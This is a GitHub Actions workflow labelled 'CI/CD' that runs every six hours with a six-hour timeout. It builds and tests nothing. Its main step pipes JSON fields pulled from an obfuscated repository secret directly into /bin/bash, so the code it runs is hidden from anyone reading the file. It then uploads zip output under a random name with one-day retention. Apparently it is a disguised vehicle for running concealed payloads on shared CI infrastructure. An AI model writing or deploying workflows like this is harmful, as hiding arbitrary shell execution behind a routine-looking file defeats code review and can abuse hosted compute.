name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '34 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          kap9162: ${{ secrets.kap9162 }}
        run: |
          printf '%s' "$kap9162" | jq -r .k4989 | /bin/bash
          printf '%s' "$ezau40" | jq -r .apq16 | /bin/bash
          printf '%s' "$zqv717" | jq -r .hc8 | /bin/bash
          printf '%s' "$hw1" | jq -r .xutcj63 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: pegMOiIo
          path: "*.zip"
          retention-days: 1
